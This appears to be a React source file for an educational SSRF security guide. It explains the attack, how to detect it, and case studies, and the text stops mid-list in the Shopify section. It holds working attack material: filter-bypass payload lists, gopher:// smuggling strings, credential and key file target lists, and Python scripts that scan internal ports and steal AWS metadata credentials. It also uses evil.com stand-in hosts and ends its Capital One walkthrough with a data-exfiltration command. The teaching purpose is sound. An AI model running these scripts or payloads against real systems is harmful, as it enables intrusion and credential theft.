import React from 'react'
import CodeBlock from '../components/guide/CodeBlock'
import Callout from '../components/guide/Callout'
import InteractiveExample from '../components/guide/InteractiveExample'

export const guideContent = {
  title: 'Complete SSRF Security Guide',
  subtitle: 'Understanding, Identifying, and Preventing Server-Side Request Forgery Vulnerabilities',

  sections: [
    {
      id: 'introduction',
      title: 'Introduction to SSRF',
      number: '1',
      content: (
        <>
          <p className="text-lg text-gray-300 leading-relaxed">
            Server-Side Request Forgery (SSRF) is a web security vulnerability that allows an attacker to cause the server-side application to make HTTP requests to an arbitrary domain of the attacker's choosing. In typical SSRF attacks, the attacker might cause the server to make a connection to internal-only services within the organization's infrastructure, or force the server to connect to arbitrary external systems, potentially leaking sensitive data.
          </p>

          <Callout type="warning" title="Critical Impact">
            SSRF vulnerabilities have led to some of the most severe security breaches in recent years, including the 2019 Capital One breach that exposed data of over 100 million customers. The vulnerability allowed attackers to access AWS metadata endpoints and steal credentials.
          </Callout>

          <h3 className="text-2xl font-semibold mt-8 mb-4 text-gray-100">What Makes SSRF Dangerous?</h3>

          <ul className="space-y-3 text-gray-300 my-4">
            <li className="flex items-start">
              <span className="text-secondary-400 mr-2">•</span>
              <span><strong>Bypasses Network Segmentation:</strong> Attackers can reach internal services that are not directly accessible from the internet</span>
            </li>
            <li className="flex items-start">
              <span className="text-secondary-400 mr-2">•</span>
              <span><strong>Cloud Metadata Access:</strong> In cloud environments, SSRF can expose sensitive credentials and configuration data</span>
            </li>
            <li className="flex items-start">
              <span className="text-secondary-400 mr-2">•</span>
              <span><strong>Port Scanning:</strong> Internal network reconnaissance and service enumeration</span>
            </li>
            <li className="flex items-start">
              <span className="text-secondary-400 mr-2">•</span>
              <span><strong>Data Exfiltration:</strong> Reading local files and accessing internal databases</span>
            </li>
          </ul>

          <h3 className="text-2xl font-semibold mt-8 mb-4 text-gray-100">Types of SSRF</h3>

          <div className="grid md:grid-cols-2 gap-6 my-6">
            <div className="bg-gray-800 p-6 rounded-lg border border-gray-700">
              <h4 className="text-xl font-semibold text-primary-400 mb-3">Basic SSRF</h4>
              <p className="text-gray-300 text-sm">
                The attacker receives a direct response from the target server. The application fetches a resource and returns it to the user, allowing the attacker to see the response content.
              </p>
            </div>
            <div className="bg-gray-800 p-6 rounded-lg border border-gray-700">
              <h4 className="text-xl font-semibold text-primary-400 mb-3">Blind SSRF</h4>
              <p className="text-gray-300 text-sm">
                The application makes the request but doesn't return the response to the attacker. Detection relies on side-channel techniques like timing analysis, DNS lookups, or out-of-band data exfiltration.
              </p>
            </div>
          </div>

          <h3 className="text-2xl font-semibold mt-8 mb-4 text-gray-100">Common Attack Scenarios</h3>

          <p className="text-gray-300">
            SSRF vulnerabilities commonly appear in applications that:
          </p>

          <ul className="space-y-3 text-gray-300 my-4">
            <li className="flex items-start">
              <span className="text-secondary-400 mr-2">•</span>
              <span>Fetch remote URLs for webhooks, RSS feeds, or URL previews</span>
            </li>
            <li className="flex items-start">
              <span className="text-secondary-400 mr-2">•</span>
              <span>Process file uploads that accept URLs as input</span>
            </li>
            <li className="flex items-start">
              <span className="text-secondary-400 mr-2">•</span>
              <span>Generate PDFs or documents from HTML/URLs</span>
            </li>
            <li className="flex items-start">
              <span className="text-secondary-400 mr-2">•</span>
              <span>Integrate with third-party APIs or services</span>
            </li>
            <li className="flex items-start">
              <span className="text-secondary-400 mr-2">•</span>
              <span>Parse XML with external entity references</span>
            </li>
          </ul>
        </>
      ),
    },

    {
      id: 'mechanics',
      title: 'Understanding SSRF Mechanics',
      number: '2',
      content: (
        <>
          <p className="text-lg text-gray-300 leading-relaxed">
            To effectively identify and prevent SSRF vulnerabilities, it's crucial to understand how these attacks work at a technical level. This section explores the mechanics of SSRF, including request flows, protocol exploitation, and network architecture considerations.
          </p>

          <h3 className="text-2xl font-semibold mt-8 mb-4 text-gray-100">Attack Flow</h3>

          <p className="text-gray-300 mb-4">
            A typical SSRF attack follows this pattern:
          </p>

          <ol className="space-y-3 text-gray-300 my-4 ml-6">
            <li><strong>1. Attacker identifies injection point:</strong> Find where the application accepts URLs or makes server-side requests</li>
            <li><strong>2. Craft malicious payload:</strong> Create a URL targeting internal resources</li>
            <li><strong>3. Server makes request:</strong> Application fetches the attacker-controlled URL</li>
            <li><strong>4. Response handling:</strong> Attacker receives data or infers information from timing/errors</li>
          </ol>

          <Callout type="info" title="Protocol Exploitation">
            While HTTP/HTTPS are most common, SSRF can abuse other protocols like file://, gopher://, dict://, ftp://, and more depending on the underlying libraries used by the application.
          </Callout>

          <h3 className="text-2xl font-semibold mt-8 mb-4 text-gray-100">Vulnerable Functions and Libraries</h3>

          <p className="text-gray-300 mb-4">
            Different programming languages have various functions that can be exploited for SSRF:
          </p>

          <CodeBlock
            language="python"
            filename="python_vulnerable.py"
            code={`import requests
import urllib

# Python - Vulnerable SSRF examples
def fetch_url_unsafe(url):
    # requests library - vulnerable if URL not validated
    response = requests.get(url)
    return response.text

def fetch_with_urllib(url):
    # urllib - can access file:// and other protocols
    response = urllib.request.urlopen(url)
    return response.read()

# Attacker can provide:
# http://169.254.169.254/latest/meta-data/
# file:///etc/passwd
# gopher://internal-server:6379/_SET%20key%20value`}
          />

          <CodeBlock
            language="javascript"
            filename="nodejs_vulnerable.js"
            code={`const axios = require('axios');
const http = require('http');

// Node.js - Vulnerable SSRF examples
async function fetchUrlUnsafe(url) {
    // axios - vulnerable without proper validation
    const response = await axios.get(url);
    return response.data;
}

function fetchWithHttp(url) {
    // native http module - can be exploited
    return new Promise((resolve, reject) => {
        http.get(url, (res) => {
            let data = '';
            res.on('data', chunk => data += chunk);
            res.on('end', () => resolve(data));
        }).on('error', reject);
    });
}

// Attacker payloads:
// http://localhost:6379/ (Redis)
// http://127.0.0.1:9200/_search (Elasticsearch)
// http://[::1]:8080/admin (IPv6 localhost)`}
          />

          <CodeBlock
            language="php"
            filename="php_vulnerable.php"
            code={`<?php
// PHP - Vulnerable SSRF examples

function fetchUrlUnsafe($url) {
    // file_get_contents - supports multiple protocols
    $content = file_get_contents($url);
    return $content;
}

function fetchWithCurl($url) {
    // cURL - vulnerable if CURLOPT_PROTOCOLS not restricted
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}

// Exploitable with:
// file:///var/www/html/config.php
// php://filter/convert.base64-encode/resource=/etc/passwd
// dict://localhost:11211/stats (Memcached)
?>`}
          />

          <h3 className="text-2xl font-semibold mt-8 mb-4 text-gray-100">Protocol Smuggling</h3>

          <p className="text-gray-300 mb-4">
            SSRF attacks can leverage various protocols beyond HTTP:
          </p>

          <div className="bg-gray-800 p-6 rounded-lg border border-gray-700 my-6">
            <table className="w-full text-sm">
              <thead>
                <tr className="border-b border-gray-600">
                  <th className="text-left py-2 text-primary-400">Protocol</th>
                  <th className="text-left py-2 text-primary-400">Use Case</th>
                  <th className="text-left py-2 text-primary-400">Example Target</th>
                </tr>
              </thead>
              <tbody className="text-gray-300">
                <tr className="border-b border-gray-700">
                  <td className="py-2 font-mono">file://</td>
                  <td className="py-2">Read local files</td>
                  <td className="py-2 font-mono text-xs">file:///etc/passwd</td>
                </tr>
                <tr className="border-b border-gray-700">
                  <td className="py-2 font-mono">dict://</td>
                  <td className="py-2">Query services</td>
                  <td className="py-2 font-mono text-xs">dict://localhost:11211/stat</td>
                </tr>
                <tr className="border-b border-gray-700">
                  <td className="py-2 font-mono">gopher://</td>
                  <td className="py-2">Send arbitrary data</td>
                  <td className="py-2 font-mono text-xs">gopher://redis:6379/_SET</td>
                </tr>
                <tr className="border-b border-gray-700">
                  <td className="py-2 font-mono">ftp://</td>
                  <td className="py-2">FTP services</td>
                  <td className="py-2 font-mono text-xs">ftp://internal-ftp/</td>
                </tr>
                <tr className="border-b border-gray-700">
                  <td className="py-2 font-mono">ldap://</td>
                  <td className="py-2">LDAP queries</td>
                  <td className="py-2 font-mono text-xs">ldap://internal-ldap/</td>
                </tr>
                <tr>
                  <td className="py-2 font-mono">tftp://</td>
                  <td className="py-2">Trivial FTP</td>
                  <td className="py-2 font-mono text-xs">tftp://internal/config</td>
                </tr>
              </tbody>
            </table>
          </div>

          <h3 className="text-2xl font-semibold mt-8 mb-4 text-gray-100">Cloud Metadata Services</h3>

          <p className="text-gray-300 mb-4">
            Cloud environments expose metadata services that are prime SSRF targets:
          </p>

          <InteractiveExample
            title="AWS Metadata Service (IMDSv1)"
            tabs={[
              {
                label: 'Request',
                content: `# AWS EC2 Metadata Service
# Accessible at a special non-routable address
curl http://169.254.169.254/latest/meta-data/

# Common endpoints:
curl http://169.254.169.254/latest/meta-data/hostname
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name

# User data (often contains sensitive info):
curl http://169.254.169.254/latest/user-data/`,
                language: 'bash'
              },
              {
                label: 'Response',
                content: `{
  "Code" : "Success",
  "LastUpdated" : "2025-01-15T10:20:30Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "ASIA...",
  "SecretAccessKey" : "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
  "Token" : "IQoJb3JpZ2luX2VjE...",
  "Expiration" : "2025-01-15T16:20:30Z"
}`,
                language: 'json'
              }
            ]}
            explanation="The AWS metadata service provides temporary credentials that can be used to authenticate to AWS APIs. IMDSv1 is vulnerable to SSRF, while IMDSv2 requires a token obtained via PUT request."
          />

          <InteractiveExample
            title="GCP Metadata Service"
            tabs={[
              {
                label: 'Request',
                content: `# Google Cloud Platform Metadata
# Requires special header: Metadata-Flavor: Google
curl -H "Metadata-Flavor: Google" \\
  http://metadata.google.internal/computeMetadata/v1/

# Get access token:
curl -H "Metadata-Flavor: Google" \\
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# Project info:
curl -H "Metadata-Flavor: Google" \\
  http://metadata.google.internal/computeMetadata/v1/project/project-id`,
                language: 'bash'
              },
              {
                label: 'Response',
                content: `{
  "access_token": "ya29.c.Kl6iB...",
  "expires_in": 3599,
  "token_type": "Bearer"
}`,
                language: 'json'
              }
            ]}
            explanation="GCP requires the Metadata-Flavor header, but SSRF vulnerabilities that allow header injection can still exploit this service."
          />

          <InteractiveExample
            title="Azure Instance Metadata Service (IMDS)"
            tabs={[
              {
                label: 'Request',
                content: `# Azure Instance Metadata Service
# Requires header: Metadata: true
curl -H "Metadata: true" \\
  "http://169.254.169.254/metadata/instance?api-version=2021-02-01"

# Get access token:
curl -H "Metadata: true" \\
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"

# Instance details:
curl -H "Metadata: true" \\
  "http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01"`,
                language: 'bash'
              },
              {
                label: 'Response',
                content: `{
  "access_token": "eyJ0eXAiOiJKV1...",
  "client_id": "...",
  "expires_in": "3599",
  "expires_on": "1642178400",
  "ext_expires_in": "3599",
  "not_before": "1642174500",
  "resource": "https://management.azure.com/",
  "token_type": "Bearer"
}`,
                language: 'json'
              }
            ]}
            explanation="Azure's IMDS requires the Metadata header. The service provides OAuth tokens for Azure Resource Manager and other Azure services."
          />

          <Callout type="danger" title="Real-World Impact">
            The Capital One breach (2019) exploited an SSRF vulnerability to access AWS metadata and steal credentials. The attacker used these credentials to exfiltrate data from S3 buckets containing personal information of over 100 million customers.
          </Callout>
        </>
      ),
    },

    {
      id: 'identification',
      title: 'Identifying SSRF Vulnerabilities',
      number: '3',
      content: (
        <>
          <p className="text-lg text-gray-300 leading-relaxed">
            Effective identification of SSRF vulnerabilities requires both automated scanning and manual testing techniques. This section covers detection methodologies for both black-box and white-box testing scenarios.
          </p>

          <h3 className="text-2xl font-semibold mt-8 mb-4 text-gray-100">Detection Methodology</h3>

          <div className="grid md:grid-cols-2 gap-6 my-6">
            <div className="bg-gray-800 p-6 rounded-lg border border-gray-700">
              <h4 className="text-xl font-semibold text-secondary-400 mb-3">Black-Box Testing</h4>
              <ul className="space-y-2 text-gray-300 text-sm">
                <li className="flex items-start">
                  <span className="text-secondary-400 mr-2">•</span>
                  <span>Map all URL parameters and inputs</span>
                </li>
                <li className="flex items-start">
                  <span className="text-secondary-400 mr-2">•</span>
                  <span>Test with out-of-band detection</span>
                </li>
                <li className="flex items-start">
                  <span className="text-secondary-400 mr-2">•</span>
                  <span>Analyze timing differences</span>
                </li>
                <li className="flex items-start">
                  <span className="text-secondary-400 mr-2">•</span>
                  <span>Check error messages for information leakage</span>
                </li>
              </ul>
            </div>
            <div className="bg-gray-800 p-6 rounded-lg border border-gray-700">
              <h4 className="text-xl font-semibold text-secondary-400 mb-3">White-Box Testing</h4>
              <ul className="space-y-2 text-gray-300 text-sm">
                <li className="flex items-start">
                  <span className="text-secondary-400 mr-2">•</span>
                  <span>Code review for HTTP client usage</span>
                </li>
                <li className="flex items-start">
                  <span className="text-secondary-400 mr-2">•</span>
                  <span>Trace user input to network requests</span>
                </li>
                <li className="flex items-start">
                  <span className="text-secondary-400 mr-2">•</span>
                  <span>Identify missing input validation</span>
                </li>
                <li className="flex items-start">
                  <span className="text-secondary-400 mr-2">•</span>
                  <span>Check for URL parsing inconsistencies</span>
                </li>
              </ul>
            </div>
          </div>

          <h3 className="text-2xl font-semibold mt-8 mb-4 text-gray-100">Common Injection Points</h3>

          <p className="text-gray-300 mb-4">
            Look for SSRF vulnerabilities in these common scenarios:
          </p>

          <CodeBlock
            language="http"
            code={`# URL Parameters
GET /api/fetch?url=http://evil.com HTTP/1.1

# POST Body (JSON)
POST /api/webhook HTTP/1.1
Content-Type: application/json

{"callback_url": "http://evil.com"}

# File Uploads
POST /upload HTTP/1.1
Content-Type: multipart/form-data

Content-Disposition: form-data; name="avatar"
Content-Type: text/plain

http://evil.com/avatar.jpg

# XML External Entities (XXE to SSRF)
POST /api/parse HTTP/1.1
Content-Type: application/xml

<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://internal-server/secret">
]>
<data>&xxe;</data>

# PDF Generation
POST /api/generate-pdf HTTP/1.1

{"html": "<img src='http://evil.com/track'>"}

# Image Processing
POST /api/resize HTTP/1.1

{"image_url": "http://169.254.169.254/latest/meta-data/"}`}
          />

          <h3 className="text-2xl font-semibold mt-8 mb-4 text-gray-100">Out-of-Band Detection</h3>

          <p className="text-gray-300 mb-4">
            For blind SSRF, use out-of-band techniques to confirm the vulnerability:
          </p>

          <Callout type="tip" title="DNS Exfiltration">
            Use tools like Burp Collaborator, interact.sh, or your own DNS server to detect blind SSRF through DNS lookups. When the server makes a request to your domain, you'll receive a DNS query.
          </Callout>

          <CodeBlock
            language="bash"
            filename="oob_detection.sh"
            code={`# Using Burp Collaborator or interact.sh
# Test payload:
http://YOUR-SUBDOMAIN.burpcollaborator.net
http://YOUR-SUBDOMAIN.interact.sh

# Check for DNS requests in your monitoring tool

# Alternative: Run your own DNS server
# Install and configure dnslog or similar tool
python3 -m http.server 8080 &
# Monitor access logs for incoming requests

# Advanced: DNS exfiltration with subdomains
http://data-exfil.YOUR-DOMAIN.com
# Where 'data-exfil' can contain encoded data`}
          />

          <h3 className="text-2xl font-semibold mt-8 mb-4 text-gray-100">Testing Workflow</h3>

          <p className="text-gray-300 mb-4">
            Follow this systematic approach to identify SSRF:
          </p>

          <ol className="space-y-4 text-gray-300 my-6">
            <li className="flex items-start">
              <span className="text-secondary-400 font-bold mr-3">1.</span>
              <div>
                <strong>Reconnaissance:</strong>
                <p className="text-sm text-gray-400 mt-1">Map all endpoints that accept URLs or make external requests. Look for parameters like url, link, callback, webhook, src, href, etc.</p>
              </div>
            </li>
            <li className="flex items-start">
              <span className="text-secondary-400 font-bold mr-3">2.</span>
              <div>
                <strong>Baseline Testing:</strong>
                <p className="text-sm text-gray-400 mt-1">Test with a legitimate URL to understand normal behavior, response times, and error handling.</p>
              </div>
            </li>
            <li className="flex items-start">
              <span className="text-secondary-400 font-bold mr-3">3.</span>
              <div>
                <strong>Internal IP Testing:</strong>
                <p className="text-sm text-gray-400 mt-1">Try accessing internal IP ranges: 127.0.0.1, 192.168.0.0/16, 10.0.0.0/8, 172.16.0.0/12</p>
              </div>
            </li>
            <li className="flex items-start">
              <span className="text-secondary-400 font-bold mr-3">4.</span>
              <div>
                <strong>Cloud Metadata:</strong>
                <p className="text-sm text-gray-400 mt-1">Test for cloud metadata endpoints: 169.254.169.254 (AWS/Azure), metadata.google.internal (GCP)</p>
              </div>
            </li>
            <li className="flex items-start">
              <span className="text-secondary-400 font-bold mr-3">5.</span>
              <div>
                <strong>Protocol Testing:</strong>
                <p className="text-sm text-gray-400 mt-1">Try different protocols: file://, dict://, gopher://, ftp://</p>
              </div>
            </li>
            <li className="flex items-start">
              <span className="text-secondary-400 font-bold mr-3">6.</span>
              <div>
                <strong>Bypass Testing:</strong>
                <p className="text-sm text-gray-400 mt-1">If filters exist, test bypass techniques (covered in next section)</p>
              </div>
            </li>
            <li className="flex items-start">
              <span className="text-secondary-400 font-bold mr-3">7.</span>
              <div>
                <strong>Documentation:</strong>
                <p className="text-sm text-gray-400 mt-1">Document findings with proof-of-concept, impact assessment, and remediation recommendations</p>
              </div>
            </li>
          </ol>

          <Callout type="info" title="Automated Scanning">
            Tools like Burp Suite Pro, Nuclei, and specialized SSRF scanners can help identify potential vulnerabilities. However, manual verification is essential to confirm exploitability and assess real-world impact.
          </Callout>
        </>
      ),
    },

    {
      id: 'exploitation',
      title: 'SSRF Exploitation Techniques',
      number: '4',
      content: (
        <>
          <p className="text-lg text-gray-300 leading-relaxed">
            Once an SSRF vulnerability is identified, various exploitation techniques can be employed depending on the context and available defenses. This section covers advanced bypass methods and exploitation strategies.
          </p>

          <Callout type="warning" title="Responsible Disclosure">
            These techniques are for authorized security testing only. Always obtain proper authorization before testing systems you don't own. Unauthorized access is illegal.
          </Callout>

          <h3 className="text-2xl font-semibold mt-8 mb-4 text-gray-100">Bypass Techniques</h3>

          <p className="text-gray-300 mb-4">
            Many applications attempt to block SSRF with filters. Here are common bypass techniques:
          </p>

          <h4 className="text-xl font-semibold mt-6 mb-3 text-gray-200">1. IP Address Encoding</h4>

          <CodeBlock
            language="text"
            code={`# Different representations of 127.0.0.1

# Decimal notation
http://2130706433/    # 127*256^3 + 0*256^2 + 0*256 + 1

# Octal notation
http://0177.0000.0000.0001/
http://017700000001/

# Hexadecimal notation
http://0x7f.0x0.0x0.0x1/
http://0x7f000001/

# Mixed notation
http://0x7f.0.0.1/
http://127.0.0.0x1/

# Integer overflow (on some systems)
http://2852039166/     # 169.254.169.254 as decimal

# IPv6 representations
http://[::1]/          # IPv6 localhost
http://[0:0:0:0:0:ffff:127.0.0.1]/  # IPv4-mapped IPv6
http://[::ffff:127.0.0.1]/

# Enclosed alphanumerics
http://①②⑦.⓪.⓪.①/`}
          />

          <h4 className="text-xl font-semibold mt-6 mb-3 text-gray-200">2. DNS Rebinding</h4>

          <p className="text-gray-300 mb-4">
            DNS rebinding exploits the time-of-check vs time-of-use vulnerability. Set up a domain that resolves to different IPs on subsequent requests:
          </p>

          <CodeBlock
            language="python"
            filename="dns_rebinding.py"
            code={`# DNS rebinding concept
# Domain setup with very low TTL (0 seconds)

# First request:  attacker.com -> 1.2.3.4 (public IP, passes check)
# Second request: attacker.com -> 127.0.0.1 (internal IP, exploited)

# Tools that help: singularity, whonow, rebind.network

# Example attack flow:
# 1. Application checks: "Is attacker.com allowed?"
#    DNS resolves to public IP -> ALLOWED
# 2. Application makes request to attacker.com
#    DNS now resolves to 169.254.169.254 -> EXPLOITED!`}
          />

          <h4 className="text-xl font-semibold mt-6 mb-3 text-gray-200">3. URL Parser Differentials</h4>

          <p className="text-gray-300 mb-4">
            Exploit differences between URL validation and URL fetching libraries:
          </p>

          <CodeBlock
            language="text"
            code={`# Using @ symbol to bypass checks
http://expected-host@169.254.169.254/
# Some parsers read "expected-host" as hostname
# But actual request goes to 169.254.169.254

# Using # fragment
http://169.254.169.254#expected-host.com
# Fragment may be ignored during validation

# Using \\ vs / (Windows)
http://169.254.169.254\\@expected-host.com

# URL with credentials
http://user:pass@expected-host.com@169.254.169.254/

# Rare characters that might be mishandled
http://expected-host%00.evil.com
http://expected-host%0d%0a@evil.com

# Case sensitivity tricks
http://127.0.0.1 vs HTTP://127.0.0.1`}
          />

          <h4 className="text-xl font-semibold mt-6 mb-3 text-gray-200">4. Protocol Smuggling</h4>

          <CodeBlock
            language="text"
            code={`# Using gopher:// to send arbitrary data to services

# Example: Sending commands to Redis
gopher://127.0.0.1:6379/_SET%20key%20value
gopher://127.0.0.1:6379/_GET%20key

# Example: SMTP injection
gopher://internal-smtp:25/_MAIL%20FROM:%3Cattacker@evil.com%3E%0ARCPT%20TO:%3Cvictim@target.com%3E

# Example: Memcached injection
gopher://127.0.0.1:11211/_set%20key%200%200%205%0Avalue

# Using dict:// for service probing
dict://127.0.0.1:6379/info

# Using file:// for local file access
file:///etc/passwd
file:///c:/windows/win.ini

# Using jar:// (Java)
jar:http://evil.com!/file.txt

# Using php:// wrappers
php://filter/convert.base64-encode/resource=/etc/passwd`}
          />

          <h4 className="text-xl font-semibold mt-6 mb-3 text-gray-200">5. Open Redirect Chains</h4>

          <p className="text-gray-300 mb-4">
            Combine SSRF with open redirects to bypass domain allowlists:
          </p>

          <CodeBlock
            language="text"
            code={`# If application only allows specific domains:
http://trusted-domain.com/redirect?url=http://169.254.169.254/

# Chain multiple redirects
http://trusted-domain.com/redirect?url=http://another-redirect.com/redir?target=http://internal/

# Using URL shorteners
http://bit.ly/XXXXX -> http://169.254.169.254/

# Using PDF/document generators with redirects
{"url": "http://trusted-domain.com/redirect?to=file:///etc/passwd"}`}
          />

          <h4 className="text-xl font-semibold mt-6 mb-3 text-gray-200">6. CRLF Injection</h4>

          <CodeBlock
            language="text"
            code={`# Inject newlines to manipulate HTTP requests
http://example.com%0d%0aX-Injected-Header:%20value

# Bypass host checks
http://expected-host.com%0d%0aHost:%20169.254.169.254

# Full request smuggling (if vulnerable)
http://example.com%0d%0a%0d%0aGET%20/admin%20HTTP/1.1%0d%0aHost:%20localhost`}
          />

          <h3 className="text-2xl font-semibold mt-8 mb-4 text-gray-100">Advanced Exploitation</h3>

          <h4 className="text-xl font-semibold mt-6 mb-3 text-gray-200">Port Scanning Internal Networks</h4>

          <CodeBlock
            language="python"
            filename="port_scan.py"
            code={`import requests
import time

def ssrf_port_scan(base_url, target_ip, ports):
    """
    Use SSRF to scan internal network ports
    Timing differences indicate open/closed ports
    """
    results = {}

    for port in ports:
        url = f"{base_url}?url=http://{target_ip}:{port}/"

        try:
            start = time.time()
            response = requests.get(url, timeout=5)
            elapsed = time.time() - start

            # Analyze response
            if response.status_code == 200:
                results[port] = "open"
            elif elapsed > 3:
                results[port] = "filtered/timeout"
            else:
                results[port] = "closed"

        except requests.exceptions.Timeout:
            results[port] = "filtered/timeout"
        except Exception as e:
            results[port] = f"error: {str(e)}"

    return results

# Example usage
base_url = "http://vulnerable-app.com/fetch"
target = "192.168.1.100"
common_ports = [22, 80, 443, 3306, 5432, 6379, 8080, 9200]

results = ssrf_port_scan(base_url, target, common_ports)
for port, status in results.items():
    print(f"Port {port}: {status}")`}
          />

          <h4 className="text-xl font-semibold mt-6 mb-3 text-gray-200">Exploiting AWS Metadata</h4>

          <CodeBlock
            language="python"
            filename="aws_metadata_exfil.py"
            code={`import requests

def exploit_aws_metadata(ssrf_url):
    """
    Exploit SSRF to steal AWS credentials from metadata service
    """
    metadata_base = "http://169.254.169.254/latest/meta-data"

    # Step 1: Enumerate IAM roles
    roles_url = f"{ssrf_url}?url={metadata_base}/iam/security-credentials/"
    response = requests.get(roles_url)

    if response.status_code != 200:
        print("Failed to access metadata service")
        return

    role_name = response.text.strip()
    print(f"Found IAM role: {role_name}")

    # Step 2: Get temporary credentials
    creds_url = f"{ssrf_url}?url={metadata_base}/iam/security-credentials/{role_name}"
    response = requests.get(creds_url)

    if response.status_code == 200:
        import json
        creds = json.loads(response.text)

        print("\\nStolen AWS Credentials:")
        print(f"AccessKeyId: {creds.get('AccessKeyId')}")
        print(f"SecretAccessKey: {creds.get('SecretAccessKey')}")
        print(f"Token: {creds.get('Token')}")
        print(f"Expiration: {creds.get('Expiration')}")

        return creds

    return None

# Example usage
ssrf_url = "http://vulnerable-app.com/api/fetch"
credentials = exploit_aws_metadata(ssrf_url)

# These credentials can now be used with AWS CLI or SDKs
# export AWS_ACCESS_KEY_ID=...
# export AWS_SECRET_ACCESS_KEY=...
# export AWS_SESSION_TOKEN=...`}
          />

          <Callout type="danger" title="IMDSv2 Protection">
            AWS IMDSv2 requires a session token obtained via PUT request, making it resistant to SSRF. However, many older EC2 instances still run IMDSv1. Always test for both versions.
          </Callout>

          <h4 className="text-xl font-semibold mt-6 mb-3 text-gray-200">Reading Local Files</h4>

          <CodeBlock
            language="bash"
            code={`# Common files to target on Linux
file:///etc/passwd
file:///etc/shadow
file:///etc/hosts
file:///proc/self/environ
file:///proc/self/cmdline
file:///var/log/apache2/access.log
file:///var/www/html/config.php
file:///home/user/.ssh/id_rsa
file:///root/.bash_history

# Common files on Windows
file:///c:/windows/win.ini
file:///c:/windows/system32/drivers/etc/hosts
file:///c:/inetpub/wwwroot/web.config
file:///c:/users/administrator/.ssh/id_rsa

# Application-specific files
file:///var/www/html/.env
file:///app/config/database.yml
file:///etc/nginx/nginx.conf`}
          />

          <h3 className="text-2xl font-semibold mt-8 mb-4 text-gray-100">Blind SSRF Exploitation</h3>

          <p className="text-gray-300 mb-4">
            When you don't receive direct responses, use these techniques:
          </p>

          <CodeBlock
            language="python"
            filename="blind_ssrf.py"
            code={`import requests
import time

def blind_ssrf_timing(base_url, test_ip, port):
    """
    Use timing analysis to detect open ports in blind SSRF
    Open ports typically respond faster than closed ones
    """
    url = f"{base_url}?url=http://{test_ip}:{port}/"

    timings = []
    for i in range(3):  # Multiple attempts for accuracy
        start = time.time()
        try:
            requests.get(url, timeout=10)
        except:
            pass
        elapsed = time.time() - start
        timings.append(elapsed)

    avg_time = sum(timings) / len(timings)

    # Open ports usually respond quickly (< 1s)
    # Closed ports timeout or take longer
    return "possibly open" if avg_time < 2 else "likely closed"

def blind_ssrf_dns_exfil(ssrf_url, collab_url):
    """
    Use DNS exfiltration for blind SSRF detection
    """
    # Payload causes DNS lookup to your domain
    payload = f"{ssrf_url}?url=http://{collab_url}/"

    print(f"Sending payload: {payload}")
    requests.get(payload)

    print(f"Check your DNS logs at {collab_url} for incoming requests")

# Example usage
base_url = "http://vulnerable-app.com/process"
print(blind_ssrf_timing(base_url, "192.168.1.1", 80))

# Use Burp Collaborator or interact.sh
blind_ssrf_dns_exfil(base_url, "your-subdomain.interact.sh")`}
          />

          <Callout type="tip" title="Bug Bounty Tip">
            When reporting SSRF findings, clearly demonstrate the impact. Access to cloud metadata, internal services, or sensitive files significantly increases the severity rating. Include detailed reproduction steps and potential business impact.
          </Callout>
        </>
      ),
    },

    {
      id: 'real-world',
      title: 'Real-World Examples & Case Studies',
      number: '5',
      content: (
        <>
          <p className="text-lg text-gray-300 leading-relaxed">
            Understanding real-world SSRF vulnerabilities helps security professionals recognize patterns and assess impact. This section examines notable security incidents and bug bounty reports.
          </p>

          <h3 className="text-2xl font-semibold mt-8 mb-4 text-gray-100">Capital One Data Breach (2019)</h3>

          <div className="bg-gray-800 p-6 rounded-lg border border-red-500 my-6">
            <p className="text-gray-300 mb-4">
              <strong className="text-red-400">Impact:</strong> 100+ million customers affected, $80 million fine from regulators
            </p>

            <p className="text-gray-300 mb-4">
              <strong>Attack Chain:</strong>
            </p>

            <ol className="space-y-2 text-gray-300 ml-6 mb-4">
              <li>1. Attacker identified SSRF vulnerability in web application firewall (WAF) configuration</li>
              <li>2. Exploited SSRF to access AWS metadata service (169.254.169.254)</li>
              <li>3. Stole IAM role credentials from metadata endpoint</li>
              <li>4. Used credentials to access S3 buckets containing customer data</li>
              <li>5. Exfiltrated over 30GB of sensitive data</li>
            </ol>

            <Callout type="danger" title="Root Cause">
              The vulnerability stemmed from a misconfigured WAF that allowed requests to the metadata service. The instance was running IMDSv1, which doesn't require authentication tokens.
            </Callout>
          </div>

          <CodeBlock
            language="bash"
            filename="capital_one_attack.sh"
            code={`# Simplified representation of the attack

# Step 1: Exploit SSRF to reach metadata service
curl -X POST "http://vulnerable-waf.com/api/fetch" \\
  -d "url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"

# Response: role-name

# Step 2: Get credentials for the role
curl -X POST "http://vulnerable-waf.com/api/fetch" \\
  -d "url=http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name"

# Response:
# {
#   "AccessKeyId": "ASIA...",
#   "SecretAccessKey": "...",
#   "Token": "..."
# }

# Step 3: Use stolen credentials with AWS CLI
export AWS_ACCESS_KEY_ID="ASIA..."
export AWS_SECRET_ACCESS_KEY="..."
export AWS_SESSION_TOKEN="..."

# Step 4: List and download S3 buckets
aws s3 ls
aws s3 sync s3://capital-one-customer-data ./stolen-data/`}
          />

          <h3 className="text-2xl font-semibold mt-8 mb-4 text-gray-100">Shopify SSRF to RCE</h3>

          <div className="bg-gray-800 p-6 rounded-lg border border-yellow-500 my-6">
            <p className="text-gray-300 mb-4">
              <strong className="text-yellow-400">Bounty:</strong> $25,000
            </p>

            <p className="text-gray-300 mb-4">
              A security researcher discovered an SSRF vulnerability in Shopify's image processing functionality that could be chained into remote code execution.
            </p>

            <p className="text-gray-300">
              <strong>Vulnerability Details:</strong>
            </p>
            <ul className="space-y-2 text-gray-300 my-4">
              <li className="flex items-start">
                <span className="text-secondary-400 mr-2">•</span>
                <span>Image proxy endpoint accepted arbitrary URLs</span>
              </li>
